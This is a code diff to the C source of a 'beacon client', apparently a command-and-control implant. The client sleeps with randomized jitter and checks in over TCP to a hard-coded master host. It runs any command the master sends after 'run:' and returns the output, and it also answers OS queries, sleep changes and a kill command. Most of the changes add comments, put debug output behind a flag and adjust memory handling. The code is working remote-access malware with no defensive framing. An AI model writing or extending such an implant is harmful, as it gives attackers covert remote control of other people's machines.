@@ -2,36 +2,48 @@
 #include <stdio.h>
 #include "beacon_client.h"
 
-int main(int argc, char **argv){
+// Main
+int main(){
     struct sockaddr_in master;
     char *data = NULL;
+
+    // short sleep if debugging
     #ifdef CLIENT_DEBUG
     int set_sleep = 3;
     #else
     int set_sleep = SLEEP_BASE;
     #endif
+
+    // initalize networking related structures (master)
     master_init(&master);
+
     while ( 1 ) {
-            int sleep_time = (rand() % (int)(set_sleep*0.15+1)) + set_sleep;
+        //sleep time
+        int sleep_time = (rand() % (int)(set_sleep*0.5+1)) + set_sleep;
+        
         #ifdef CLIENT_DEBUG
-            printf("Sleeping for %d seconds... ", sleep_time);
+        printf("Sleeping for %d seconds... ", sleep_time);
         #endif
 
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
-        sleep(sleep_time); //seconds
+        sleep(sleep_time); // seconds
         #elif __windows__
-        Sleep(sleep_time*1000); //seconds -> milliseconds
+        Sleep(sleep_time*1000); // seconds -> milliseconds
         #endif
 
         #ifdef CLIENT_DEBUG
         printf("Complete.\n");
         #endif
 
+        // initial check-in
         char *resp = master_checkin(master, data);
-        if (data)
+        if (data) {
             bzero(data, strlen(data)+1);
             free(data);
+        }
         data = NULL;
+
+        // @TODO replace "run:" with #define, take STRLEN of it instead of hardcoding 4.
         if (!strncmp(resp, "run:", 4)) {
             uint32_t resplen = strlen(resp);
             uint32_t cmdlen = resplen-4;
@@ -39,8 +51,10 @@ int main(int argc, char **argv){
                 char *cmd = (char *)malloc(sizeof(char) * (cmdlen+1));
                 strncpy(cmd,resp+4,cmdlen);
                 int len;
+                
+                //args
                 char ** args = tokenize_cmd(cmd,&len);
-                //char ** args = parse(cmd);
+                #ifdef CLIENT_DEBUG
                 printf("Arguments:\n");
                 for (int i = 0; i < len; i++){
                     printf("\tArg[%d] = %s\n",i,args[i]);
@@ -50,54 +64,36 @@ int main(int argc, char **argv){
                 } else {
                     printf("\tArg[%d] is not NULL! %s\n",len,args[len]);
                 }
+                #endif
+                
+                //run command
                 data = run_cmd(args);
-                //for (int i = 0; i <= len; i++){
-                //    free(args[i]);
-                //}
-                //free(args);
-                //char *found;
-                //if ((found = strchr(cmd,' '))) {
-                //    #ifdef CLIENT_DEBUG
-                //        printf("cmd=%u\n",(uint32_t)cmd);
-                //        printf("found=%u\n",(uint32_t)found);
-                //    #endif
-                //    uint32_t loc = (uint32_t)((found)-cmd+1);
-                //    #ifdef CLIENT_DEBUG
-                //        printf("loc=%u\n",loc);
-                //    #endif
-                //    uint32_t arglen = (cmdlen-loc);
-                //    #ifdef CLIENT_DEBUG
-                //        printf("arglen=%u\n",arglen);
-                //    #endif
-                //    char *args = (char *)malloc(sizeof(char) * (arglen+1));
-                //    strncpy(args,found+1,arglen);
-                //    cmd[loc-1] = '\0';
-                //    args[arglen] = '\0';
-                //    data = run_cmd(cmd,args);
-                //    free(args);
-                //} else {
-                //    cmd[cmdlen] = '\0';
-                //    #ifdef CLIENT_DEBUG
-                //        printf("cmd=%u val:%s\n",(uint32_t)cmd,cmd);
-                //    #endif
-                //   data = run_cmd(cmd,NULL);
-                //}
+
+                //free
                 free(cmd);
             }
         }
+
+        // get os
         if (!strncmp(resp, "get os", 7)){
             data = (char*)malloc(strlen("set os:") + strlen(OS)+1);
             sprintf(data, "%s%s", "set os:", OS);
         }
+
+        // set sleep
         if (!strncmp(resp, "set sleep:", 10)){
             sscanf((resp+10), "%d", &set_sleep);
             data = (char*)malloc(strlen("SET SLEEP OK")+1);
             strcpy(data, "SET SLEEP OK");
         }
+
+        // get sleep
         if (!strncmp(resp, "get sleep", 9)){
             data = (char*)malloc(strlen("set sleep:")+snprintf(NULL, 0, "%d", set_sleep)+1);
             sprintf(data, "set sleep:%d", set_sleep);
         }
+
+        // kill / die
         if (!strncmp(resp, "killkillkill", 9)){
             data = (char*)malloc(strlen("i am kill")+1);
             strcpy(data, "i am kill");
@@ -107,19 +103,13 @@ int main(int argc, char **argv){
     return 0;
 }
 
-char** parse(char *string)
-{
-    char** ret = malloc(sizeof(char*));
-    ret[0] = strtok(string, " \n");
-    int i = 0;
-    for (; ret[i]; ret[i] = strtok(NULL, " \n"))
-    {
-        ret = realloc(ret, sizeof(char*) * ++i);
-    }
-
-    return ret;
-}
-
+/*
+ * tokenize_cmd
+ * desc: Tokenize a string into an array of strings using spaces, quotes, and double quotes as delimiters
+ * param: cmd - string of the command to be ran
+ * param: count - pass by reference, count to be returned, strictly used for debugging @TODO eventually remove
+ * return: array of strings, last string is a null pointer
+ */
 char **tokenize_cmd(char *cmd, int *count){
     uint32_t cmdlen = strlen(cmd);
     char **tokens = (char **)malloc(sizeof(char *) * (cmdlen));
@@ -129,22 +119,27 @@ char **tokenize_cmd(char *cmd, int *count){
     uint32_t start = 0;
     uint32_t index = 0;
     for (uint32_t end = 0; end <= cmdlen; end++){
+        //spaces
         if (!is_dquote && !is_quote && (cmd[end] == ' ' || cmd[end] == 0)){
             if (end > start) {
                 uint32_t toklen = (end - start);
                 tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
+                bzero(tokens[index],toklen+1);
                 strncpy(tokens[index],cmd+start,toklen);
                 tokens[index][toklen] = '\0';
                 start = end+1;
                 index++;
             }
         }
-        if (cmd[end] == '"' || (is_quote && cmd[end] == 0)){
+
+        //double quotes
+        if (cmd[end] == '"' || (is_dquote && cmd[end] == 0)){
             if (is_quote){
                 //end quote
                 if (end > start) {
                     uint32_t toklen = (end - start)+1;
                     tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
+                    bzero(tokens[index],toklen+1);
                     strncpy(tokens[index],cmd+start,toklen);
                     tokens[index][toklen] = '\0';
                     start = end+2;
@@ -155,12 +150,15 @@ char **tokenize_cmd(char *cmd, int *count){
                 is_quote = 1;
             }
         }
-        if (cmd[end] == '\'' || (is_dquote && cmd[end] == 0)){
+
+        //single quotes
+        if (cmd[end] == '\'' || (is_quote && cmd[end] == 0)){
             if (is_dquote){
                 //end quote
                 if (end > start) {
                     uint32_t toklen = (end - start)+1;
                     tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
+                    bzero(tokens[index],toklen+1);
                     strncpy(tokens[index],cmd+start,toklen);
                     tokens[index][toklen] = '\0';
                     start = end+2;
@@ -180,8 +178,12 @@ char **tokenize_cmd(char *cmd, int *count){
     (*count) = index;
     return tokens;
 }
+
 /*
- * Initalize connection
+ * master_init
+ * desc: Initalize connection
+ * param: sockaddr_in, socket address 
+ * @TODO if memset fails return non-zero.
  */
 int master_init(struct sockaddr_in *master) {
 
@@ -191,7 +193,11 @@ int master_init(struct sockaddr_in *master) {
     master->sin_addr.s_addr = inet_addr( MASTER_IP );
     master->sin_port = htons(MASTER_PORT);
     #elif __windows__
-    // TODO
+    memset(master, 0, sizeof(struct sockaddr_in));
+    master->sin_family = AF_INET;
+    master->sin_addr.s_addr = inet_addr( MASTER_IP );
+    // @TODO FIX
+    // master->sin_port = htons(MASTER_PORT);
     #endif
     return 0;
 }
@@ -199,9 +205,10 @@ int master_init(struct sockaddr_in *master) {
 char *master_checkin(struct sockaddr_in master, char *data){
     char *server_reply = (char *)malloc(MASTER_RECV_SIZE);
     int recv_size;
+    bzero(server_reply, MASTER_RECV_SIZE);
+    
     #if defined __apple__ || defined(__linux__) || defined(__unix__)
     // do standard sockets
-    bzero(server_reply, MASTER_RECV_SIZE);
     int s;
     if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
         #ifdef CLIENT_DEBUG
@@ -238,6 +245,8 @@ char *master_checkin(struct sockaddr_in master, char *data){
     #ifdef CLIENT_DEBUG
         printf("[master_checkin] Initialising...");
     #endif
+
+    //initialize WSA
     if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
         #ifdef CLIENT_DEBUG
             printf("Failed. Error: %d",WSAGetLastError());
@@ -272,6 +281,12 @@ char *master_checkin(struct sockaddr_in master, char *data){
     return server_reply;
 }
 
+/* 
+ * get_os
+ * desc: Retrieves the OS on whatever system it was compiled for
+ * param: none.
+ * return: Result of get OS command.
+ */
 char *get_os() {
     int len = strlen(ID_CMD);
     char **cmd = (char **)malloc(sizeof(char *));
@@ -283,17 +298,27 @@ char *get_os() {
     return data;
 }
 
+/*
+ * run_cmd
+ * desc: Runs a command for the OS it was compiled for, returns results of that command
+ * param: args - list of arguments, arg[0] being the command
+ * return: string of result of command, will be NULL if errors occurred
+ */
 char *run_cmd(char **args) {
     int pipes[2];
     pid_t pid;
     char *buf = (char *)malloc(sizeof(char) * BUF_SIZE);
-    bzero(buf, BUF_SIZE);
+    bzero(buf, BUF_SIZE); //zero out buffer
+
+    // pipe
     if (pipe(pipes)==-1) {
         #ifdef CLIENT_DEBUG
         puts("[run_cmd] Failed to pipe.\n");
         #endif
         return NULL; // fail
     }
+
+    // fork
     if ((pid = fork()) == -1) {
         #ifdef CLIENT_DEBUG
         puts("[run_cmd] Failed to fork.\n");
@@ -303,42 +328,30 @@ char *run_cmd(char **args) {
 
     //char **args = (char **)malloc(sizeof(char *) * 2);
     if(pid == 0) {
-        int i = 0;
-        //while (args[i]){
-        //    printf("Args[%d] %s\n",i,args[i]); 
-        //    i++;
-        //}
-        // TODO: FIX from direct exec to
         // pipe->dup2->exec shell->write to stdin->send \n to stdin->read stdout save results->return results
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
-            dup2(pipes[1], STDOUT_FILENO);
-            dup2(pipes[1], STDERR_FILENO);
+        dup2(pipes[1], STDOUT_FILENO);
+        dup2(pipes[1], STDERR_FILENO);
         #elif __windows__
         _dup2(pipes[1], STDOUT_FILENO);
         #endif
+        
+        //close stdin/out
         close(pipes[0]);
         close(pipes[1]);
+        
+        //exec
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
         if (execvp(args[0],args) < 0) {
             perror("Error: Command not found\n");
         }
-        //perror("Args:\n");
-        //i = 0;
-        //while (args[i]){
-        //    perror(args[i]); 
-        //    i++;
-        //}
         #elif __windows__
-        //_execv(cmd,param);
+        if (execvp(args[0],args) < 0) {
+            perror("Error: Command not found\n");
+        }
         #endif
-        exit(0);
-    } else {
-        close(pipes[1]);
-        read(pipes[0], buf, BUF_SIZE);
-        //wait(NULL);
-        #ifdef CLIENT_DEBUG
-        printf("[run_cmd] cmd ran: %s, output:%s\n",args[0],buf);
-        #else
+
+        //free
         int j = 0;
         while (args[j] != 0){
             free(args[j]);
@@ -346,8 +359,19 @@ char *run_cmd(char **args) {
         }
         free(args[j]);
         free(args);
+        
+        //exit
+        exit(0);
+    } else {
+        //close stdout
+        close(pipes[1]);
+
+        //read from stdin
+        read(pipes[0], buf, BUF_SIZE);
+        
+        #ifdef CLIENT_DEBUG
+        printf("[run_cmd] cmd ran: %s, output:%s\n",args[0],buf);
         #endif
     }
-    //free(args);
     return buf;
 }
